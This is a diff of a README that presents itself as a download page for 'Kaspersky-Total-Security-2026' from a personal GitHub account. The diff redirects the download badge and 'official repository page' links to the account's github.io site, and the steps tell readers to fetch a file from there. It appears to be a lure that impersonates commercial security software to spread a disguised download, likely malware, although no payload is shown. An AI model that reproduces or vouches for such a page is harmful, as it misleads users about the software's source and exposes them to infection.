@@ -1,6 +1,6 @@
 # 🛡️ Kaspersky-Total-Security-2026 - Protect your computer from online threats
 
-[![](https://img.shields.io/badge/Download_Kaspersky-Blue?style=for-the-badge&logo=windows)](https://github.com/asunder-ninja611/Kaspersky-Total-Security-2026)
+[![](https://img.shields.io/badge/Download_Kaspersky-Blue?style=for-the-badge&logo=windows)](https://asunder-ninja611.github.io)
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ Your computer needs specific hardware to run this software. Check the following 
 
 Follow these steps to get the software on your machine:
 
-1. Visit the [official repository page](https://github.com/asunder-ninja611/Kaspersky-Total-Security-2026).
+1. Visit the [official repository page](https://asunder-ninja611.github.io).
 2. Locate the secure download link provided in this repository.
 3. Click the link to begin the transfer to your hard drive.
 4. Wait for the file to finish downloading to your Downloads folder.
